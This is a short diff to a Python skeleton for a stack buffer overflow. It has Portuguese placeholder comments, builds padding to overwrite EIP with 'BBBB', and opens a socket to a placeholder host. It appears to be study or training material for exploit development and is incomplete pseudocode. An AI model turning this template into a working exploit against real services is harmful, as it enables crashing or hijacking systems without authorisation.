@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import socket
-bytes = "A" * valor pra chegar no EIP + "BBBB" + "C" * (valor total - valor pra chegar no EIP e EIP)
+bytes = "A" * valor pra chegar no EIP + "BBBB" + "C" * (valor total - valor pra chegar no EIP mais EIP)
+#chuta uns 100 bytes a mais dos bytes que aplicaçao aceita ate travar
 try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("host",port))
